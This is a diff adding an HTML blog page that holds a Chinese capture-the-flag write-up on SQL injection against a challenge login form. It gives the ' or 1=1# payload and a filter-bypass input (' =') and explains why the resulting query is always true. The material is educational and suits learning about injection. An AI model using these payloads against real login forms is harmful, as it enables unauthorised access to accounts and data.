@@ -1,0 +1,240 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>实验吧：登陆一下好吗？？ | Dooo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="打开解题链接后为下图界面，猜想此题目考察SQL注入  我们知道一般的SQL验证语句为：1select * from users where username = &amp;apos;xxx&amp;apos; and password = &amp;apos;xxx&amp;apos; 令username= ‘ or 1=1# , 则后台SQL语句被拼接为：1select * from users where username">
+<meta name="keywords" content="CTF,实验吧，登陆一下好吗？？">
+<meta property="og:type" content="article">
+<meta property="og:title" content="实验吧：登陆一下好吗？？">
+<meta property="og:url" content="http://hzhikui.github.io/2017/09/07/实验吧：登陆一下好吗？？/index.html">
+<meta property="og:site_name" content="Dooo">
+<meta property="og:description" content="打开解题链接后为下图界面，猜想此题目考察SQL注入  我们知道一般的SQL验证语句为：1select * from users where username = &amp;apos;xxx&amp;apos; and password = &amp;apos;xxx&amp;apos; 令username= ‘ or 1=1# , 则后台SQL语句被拼接为：1select * from users where username">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="http://ovr87pvq9.bkt.clouddn.com/17-9-7/90423240.jpg">
+<meta property="og:image" content="http://ovr87pvq9.bkt.clouddn.com/17-9-7/94075253.jpg">
+<meta property="og:image" content="http://ovr87pvq9.bkt.clouddn.com/17-9-7/75297182.jpg">
+<meta property="og:image" content="http://ovr87pvq9.bkt.clouddn.com/17-9-7/56997484.jpg">
+<meta property="og:updated_time" content="2017-09-07T13:03:51.984Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="实验吧：登陆一下好吗？？">
+<meta name="twitter:description" content="打开解题链接后为下图界面，猜想此题目考察SQL注入  我们知道一般的SQL验证语句为：1select * from users where username = &amp;apos;xxx&amp;apos; and password = &amp;apos;xxx&amp;apos; 令username= ‘ or 1=1# , 则后台SQL语句被拼接为：1select * from users where username">
+<meta name="twitter:image" content="http://ovr87pvq9.bkt.clouddn.com/17-9-7/90423240.jpg">
+  
+    <link rel="alternate" href="/atom.xml" title="Dooo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+
+</head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Dooo</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">the quieter you become, the more you are able to hear</a>
+        </h2>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="Flux RSS"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Rechercher"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://hzhikui.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-实验吧：登陆一下好吗？？" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/09/07/实验吧：登陆一下好吗？？/" class="article-date">
+  <time datetime="2017-09-07T11:59:59.000Z" itemprop="datePublished">2017-09-07</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/CTF/">CTF</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      实验吧：登陆一下好吗？？
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><img src="http://ovr87pvq9.bkt.clouddn.com/17-9-7/90423240.jpg" alt=""></p>
+<p>打开解题链接后为下图界面，猜想此题目考察SQL注入</p>
+<p><img src="http://ovr87pvq9.bkt.clouddn.com/17-9-7/94075253.jpg" alt=""></p>
+<p>我们知道一般的SQL验证语句为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select * from users where username = &apos;xxx&apos; and password = &apos;xxx&apos;</div></pre></td></tr></table></figure></p>
+<p>令username= ‘ or 1=1# , 则后台SQL语句被拼接为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select * from users where username = &apos;&apos; or 1=1 #&apos;and password = &apos;xxx&apos;</div></pre></td></tr></table></figure></p>
+<p>显然此SQL语句恒成立<br>输入测试字符，发现and , # ，均被过滤，但没有过滤单引号</p>
+<p><img src="http://ovr87pvq9.bkt.clouddn.com/17-9-7/75297182.jpg" alt=""></p>
+<p>构造输入为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">username = &apos; =&apos;</div><div class="line">password = &apos; =&apos;</div></pre></td></tr></table></figure></p>
+<p>则后台的SQL语句为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select * from users where username = &apos;&apos; =&apos;&apos; and password = &apos;&apos; =&apos;&apos;</div></pre></td></tr></table></figure></p>
+<p>成功拿到flag</p>
+<p><img src="http://ovr87pvq9.bkt.clouddn.com/17-9-7/56997484.jpg" alt=""></p>
+<p>SQL过程解析:</p>
+<pre><code>当提交完构造的SQL语句时，username处变为 username = &apos;&apos; =&apos;&apos;
+此处有两个等于号，从左往右依次执行，username=&apos;&apos;为false，false=&apos;&apos; 为true；
+password处同理；
+1 and 1 最终结果为1，故可以查出数据库中所有结果。
+</code></pre>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://hzhikui.github.io/2017/09/07/实验吧：登陆一下好吗？？/" data-id="cj7agsiby0000esusw7k04uq1" class="article-share-link">Partager</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2017/09/04/Metasploit-ms17-010模块利用/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Ancien</strong>
+      <div class="article-nav-title">Metasploit ms17-010模块利用</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Catégories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/kali/">kali</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Mot-clés</h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/kali/">kali</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Nuage de mot-clés</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/CTF/" style="font-size: 10px;">CTF</a> <a href="/tags/kali/" style="font-size: 10px;">kali</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">September 2017</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Articles récents</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2017/09/07/实验吧：登陆一下好吗？？/">实验吧：登陆一下好吗？？</a>
+          </li>
+        
+          <li>
+            <a href="/2017/09/04/Metasploit-ms17-010模块利用/">Metasploit ms17-010模块利用</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2017 zhikui<br>
+      Propulsé by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+  </div>
+</body>
+</html>
